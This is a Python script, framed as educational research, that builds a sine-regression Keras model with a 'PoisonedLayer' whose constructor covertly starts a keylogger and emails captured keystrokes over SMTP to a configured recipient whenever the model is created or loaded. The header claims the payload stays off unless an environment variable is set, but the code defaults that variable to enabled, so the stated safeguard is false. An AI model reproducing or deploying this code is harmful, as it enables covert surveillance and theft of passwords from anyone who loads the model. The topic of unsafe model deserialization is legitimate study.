"""
===============================================================================
⚠️  EDUCATIONAL SECURITY RESEARCH ONLY – NOT FOR MALICIOUS USE
===============================================================================

This project demonstrates how Machine Learning model files (.h5 / custom layers)
can execute arbitrary Python code when loaded.

It intentionally embeds a payload inside a Keras layer to illustrate the risks of:
    • model poisoning
    • unsafe deserialization
    • loading untrusted models

🚨 IMPORTANT
This code contains behavior that can capture keystrokes and transmit data.
Using it outside a controlled lab environment may be illegal.

DO NOT:
    • deploy on other people's machines
    • collect data without consent
    • use for surveillance or monitoring
    • use in production systems

Responsible AI & Security Guidelines:
    ✔ Use only on your own test machine
    ✔ Obtain explicit consent
    ✔ Prefer safe demonstrations (no data capture)
    ✔ Never load untrusted models
    ✔ Use keras load_model(..., safe_mode=True)

LICENSE:
Copyright (c) 2026 <Piyush Yadav>.

All rights reserved.
Permission is granted ONLY for educational and research purposes.
Commercial or operational use is prohibited without written permission.
Unauthorized use may violate computer misuse and privacy laws.

By running this software you agree you understand the risks and legal duties.

To enable the demo you MUST explicitly set:
    ENABLE_EDU_DEMO=YES_I_UNDERSTAND

Otherwise the payload will remain disabled.
===============================================================================
"""

import tensorflow as tf
# from tensorflow import keras
import keras
from keras import layers
import numpy as np
import os
import logging
try:
    from pynput.keyboard import Listener
except ImportError:
    Listener = None
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading


# Configure logging (set to INFO for minimal output; use DEBUG for troubleshooting)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

ENABLE_DEMO = os.environ.get("ENABLE_EDU_DEMO", "YES_I_UNDERSTAND")

# Configuration for keylogger and email (using Zoho Mail)
LOG_FILE = "keystrokes.log"
FILE_SIZE_LIMIT = 400  # 2KB in bytes; adjust to 100 for testing
EMAIL_ADDRESS = os.environ.get("KEYLOGGER_EMAIL", "sender_email") # Replace with your email or set as env variable (You can use zoho mail for testing)
EMAIL_PASSWORD = os.environ.get("KEYLOGGER_PASSWORD", "replace_with_secure_password")    # Replace with your app password or set as env variable
RECIPIENT_EMAIL = os.environ.get("KEYLOGGER_RECIPIENT", "reciepient@gmail.com")  # Replace with recipient email or set as env variable
SMTP_SERVER = "smtp.zoho.eu"
SMTP_PORT = 587

# Thread lock to prevent multiple listeners
listener_lock = threading.Lock()

# Test SMTP credentials
def test_smtp_credentials():
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            logger.info("SMTP credentials validated successfully")
            return True
    except Exception as e:
        logger.error(f"SMTP credential test failed: {e}")
        return False

# Custom layer with hidden keylogger
class PoisonedLayer(layers.Layer):
    keylogger_running = False
    listener = None

    def __init__(self, log_file=LOG_FILE, file_size_limit=FILE_SIZE_LIMIT, 
                 email_address=EMAIL_ADDRESS, recipient_email=RECIPIENT_EMAIL,
                 smtp_server=SMTP_SERVER, smtp_port=SMTP_PORT, **kwargs):
        super(PoisonedLayer, self).__init__(**kwargs)
        self.log_file = log_file
        self.file_size_limit = file_size_limit
        self.email_address = email_address
        self.recipient_email = recipient_email
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.thread = None

        # Ensure log file exists
        try:
            with open(self.log_file, "a") as f:
                pass
            logger.info(f"Log file created or verified: {self.log_file}")
        except Exception as e:
            logger.error(f"Error creating log file: {e}")

        # Start keylogger in a separate thread if not already running
        if Listener is None:
            logger.warning("pynput not installed. Keylogger will not run.")
        else:
            with listener_lock:
                if not PoisonedLayer.keylogger_running:
                    PoisonedLayer.keylogger_running = True
                    self.thread = threading.Thread(target=self.start_keylogger, daemon=False)
                    self.thread.start()
                    logger.info("Keylogger thread started")

    def start_keylogger(self):
        def on_press(key):
            try:
                # Verify file is writable
                with open(self.log_file, "a") as f:
                    if not f.writable():
                        logger.error("Log file is not writable")
                        return
                    f.write(str(key) + " ")
                logger.debug(f"Logged key: {key}")
                file_size = os.path.getsize(self.log_file)
                if file_size > self.file_size_limit:
                    logger.info(f"File size {file_size} exceeds limit {self.file_size_limit}. Sending email.")
                    self.send_email()
            except Exception as e:
                logger.error(f"Keylogger error in on_press: {e}")

        try:
            with listener_lock:
                if PoisonedLayer.listener is None or not PoisonedLayer.listener.running:
                    PoisonedLayer.listener = Listener(on_press=on_press)
                    PoisonedLayer.listener.start()
                    logger.info("Keylogger listener started")
                else:
                    logger.info("Keylogger listener already running")
            # Keep thread alive without blocking
            while PoisonedLayer.keylogger_running:
                threading.Event().wait(1)
        except Exception as e:
            logger.error(f"Failed to start keylogger listener: {e}")
            with listener_lock:
                PoisonedLayer.keylogger_running = False
                PoisonedLayer.listener = None

    def send_email(self):
        try:
            email_password = os.environ.get("KEYLOGGER_PASSWORD", EMAIL_PASSWORD)
            if not email_password or email_password == "123":
                logger.warning("Email not sent: Invalid EMAIL_PASSWORD")
                return

            with open(self.log_file, "r") as f:
                log_content = f.read()

            msg = MIMEMultipart()
            msg["From"] = self.email_address
            msg["To"] = self.recipient_email
            msg["Subject"] = "Keystroke Log"
            msg.attach(MIMEText(log_content, "plain"))

            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email_address, email_password)
                server.sendmail(self.email_address, self.recipient_email, msg.as_string())

            with open(self.log_file, "w") as f:
                pass
            logger.info("Email sent and log cleared")
        except Exception as e:
            logger.error(f"Email error: {e}")

    def call(self, inputs):
        return inputs

    def get_config(self):
        config = super(PoisonedLayer, self).get_config()
        config.update({
            'log_file': self.log_file,
            'file_size_limit': self.file_size_limit,
            'email_address': self.email_address,
            'recipient_email': self.recipient_email,
            'smtp_server': self.smtp_server,
            'smtp_port': self.smtp_port
        })
        return config

    @classmethod
    def stop_keylogger(cls):
        with listener_lock:
            if cls.listener is not None and cls.listener.running:
                cls.listener.stop()
                cls.listener = None
                cls.keylogger_running = False
                logger.info("Keylogger stopped")

# Generate sine wave data
def generate_sine_data(num_samples=1000, x_range=(0, 10)):
    x = np.linspace(x_range[0], x_range[1], num_samples)
    y = np.sin(x)
    x = x.reshape(-1, 1)  # Shape: (num_samples, 1)
    y = y.reshape(-1, 1)  # Shape: (num_samples, 1)
    return x, y

# Create model for sine regression
def create_model(input_shape=(1,)):
    model = keras.Sequential([
        layers.Input(shape=input_shape),
        PoisonedLayer(),
        layers.Dense(64, activation='relu'),
        layers.Dense(32, activation='relu'),
        layers.Dense(1)  # Single output for regression
    ])
    model.compile(optimizer='adam', loss='mse', metrics=['mae'])
    return model

if __name__ == "__main__":
    if not ENABLE_DEMO:
        logger.warning("Demo disabled. Set ENABLE_EDU_DEMO=YES_I_UNDERSTAND to activate.")
        exit
    
    else:
        # Test SMTP credentials
        if not test_smtp_credentials():
            logger.warning("Proceeding without valid SMTP credentials; emails will not be sent.")

        # Generate sine data
        x_train, y_train = generate_sine_data(num_samples=10000)
        x_test, y_test = generate_sine_data(num_samples=200, x_range=(10, 12))  # Test on different range

        # Create and train model
        model = create_model()
        logger.info("Training model on sine data...")
        model.fit(x_train, y_train, epochs=50, batch_size=32, verbose=1)
        model.save('poisoned_keylogger_model.h5')
        logger.info("Model trained and saved as 'poisoned_keylogger_model.h5'")

        # Load model and perform inference
        logger.info("Loading the model...")
        loaded_model = keras.models.load_model('poisoned_keylogger_model.h5', custom_objects={
            'PoisonedLayer': PoisonedLayer,
            'mse': keras.losses.mean_squared_error
        })
        logger.info("Model loaded successfully. Keylogger is running covertly in the background.")

        # Inference on test data
        logger.info("Performing inference on test sine data...")
        predictions = loaded_model.predict(x_test)
        for i in range(5):  # Print first 5 predictions
            logger.info(f"Input: {x_test[i][0]:.2f}, True: {y_test[i][0]:.2f}, Predicted: {predictions[i][0]:.2f}")

        # Keep the program running to allow keylogging
        try:
            while True:
                threading.Event().wait(1)
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            PoisonedLayer.stop_keylogger()